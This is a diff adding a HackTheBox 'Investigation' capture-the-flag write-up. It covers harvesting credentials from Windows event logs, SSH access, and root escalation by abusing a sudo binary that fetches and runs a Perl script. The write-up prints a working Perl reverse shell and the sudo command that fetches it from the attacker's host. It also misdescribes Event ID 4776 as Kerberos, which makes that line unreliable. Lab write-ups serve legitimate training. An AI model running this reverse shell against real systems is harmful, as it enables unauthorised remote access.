@@ -81,3 +81,122 @@ I downloaded the e-mail attachment in my machine as well. After unzipping the at
 
 I tried to read it's content but it's not in the humand readable format so then I used a script from this [GitHub repo](https://github.com/williballenthin/python-evtx/blob/master/scripts/evtx_dump.py) to dump the file in the humand readable format.
 
+![image](https://user-images.githubusercontent.com/87700008/221610703-a611b949-e510-4bef-99b4-e462cbf5ef8e.png)
+![image](https://user-images.githubusercontent.com/87700008/221610779-c14d1770-15d7-4999-ba51-4e89f2bc5f4c.png)
+
+When checking the dump file, I found some credentials in that dump file. As the dump file is too big I used the event code '4776' to check for any intresting strings.
+    
+    Event ID 4776 is a security-related event that is logged when a computer attempts to authenticate a user account using Kerberos authentication. This event is triggered when an authentication attempt fails, and helps identify where the failure occurred.
+    
+![image](https://user-images.githubusercontent.com/87700008/221618208-c639d9a1-d408-4cac-ad5f-a2d0d39f3997.png)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## User flag:
+
+I tried to use the gathered credentials with 'Smorton' account to login. And successfully logged in using SSH. (pwn3d!🙂)
+
+![image](https://user-images.githubusercontent.com/87700008/221619018-273202a5-d30b-41c6-a2b4-59fd42c2444d.png)
+
+After logging in I got the user flag into 'smorton' home directory.
+
+![image](https://user-images.githubusercontent.com/87700008/221619403-e1478558-7076-4998-93be-fe436cf3a34e.png)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Priv Esc:
+
+I started with the manual enumeration & checked for the sudo permissions 'sudo -l' & got this :
+
+![image](https://user-images.githubusercontent.com/87700008/221628022-11bc581a-2f3d-4b4d-b65e-52d1f981e00a.png)
+
+So, then I checked the 'binary' file using string command but the information is not clear in it:
+
+![image](https://user-images.githubusercontent.com/87700008/221628425-220d6429-b93b-4292-a638-127a95e58a60.png)
+
+
+*At this point I was stucked & executed the LinPeas as well to find the other possible vectors as well but didn't found any. So, then I checked for the hints online & got this [walkthrough](https://systemweakness.com/hackthebox-linux-box-investigation-e64b97ca7876)*
+
+In the blog, I found that he the author uploaded the binary file to [online decompile](https://dogbolt.org/) & then reviewed the source code.
+
+He extracted the main function of the binary, that can be seen in couple of parts.
+
+```int32_t main(int32_t argc, char** argv, char** envp)
+{
+    if (argc != 3)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    if (getuid() != 0)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    if (strcmp(argv[2], "lDnxUysaQn") != 0)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    puts("Running... ");
+    FILE* rax_8 = fopen(argv[2], &data_2027);
+    int64_t rax_9 = curl_easy_init();
+    int32_t var_40 = 0x2712;
+    curl_easy_setopt(rax_9, 0x2712, argv[1], 0x2712);
+    int32_t var_3c = 0x2711;
+    curl_easy_setopt(rax_9, 0x2711, rax_8, 0x2711);
+    int32_t var_38 = 0x2d;
+    curl_easy_setopt(rax_9, 0x2d, 1, 0x2d);
+    if (curl_easy_perform(rax_9) != 0)
+    {
+        puts("Exiting... ");
+        exit(0);
+        /* no return */
+    }
+    int64_t rax_25 = snprintf(nullptr, 0, &data_202a, argv[2]);
+    char* rax_28 = malloc((rax_25 + 1));
+    snprintf(rax_28, (rax_25 + 1), &data_202a, argv[2]);
+    int64_t rax_37 = snprintf(nullptr, 0, "perl ./%s", rax_28);
+    char* rax_40 = malloc((rax_37 + 1));
+    snprintf(rax_40, (rax_37 + 1), "perl ./%s", rax_28);
+    fclose(rax_8);
+    curl_easy_cleanup(rax_9);
+    setuid(0);
+    system(rax_40);
+    system("rm -f ./lDnxUysaQn");
+    return 0;
+}
+```
+
+Firstly, it checks whether three input parameters have been sent through (actually two because the first parameter is the program name itself) and exits if not.
+
+Secondly, it checks whether a root user calls it (achievable because we can run it as root without a password) and exits if not.
+
+Thirdly, it checks whether the third parameter is equal to the string lDnxUysaQn, and exits if not.
+
+Fourthly, it opens a file with curl which is specified by the second parameter and reads and runs with perl.
+
+And it can be seen that the machine would send the get request to the specified URL.
+
+![image](https://user-images.githubusercontent.com/87700008/221631208-5a9a09bf-9176-430e-b33e-0f9dda4d9412.png)
+
+I then hosted a perl based revsershell in my kali machine :
+
+``` use Socket;
+$i="[My_IP_here]";
+$p=53;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){
+ open(STDIN,">&S");open(STDOUT,">&S");
+ open(STDERR,">&S");exec("/bin/bash -i");
+};
+```
+
+I then executed the command & got the shell. (pwn3d!🙂)
+
+    sudo /usr/bin/binary 10.10.X.X/shell.pl lDnxUysaQn
+    
+![image](https://user-images.githubusercontent.com/87700008/221632999-e60d0734-155c-4972-9f57-4ec74c8725b3.png)
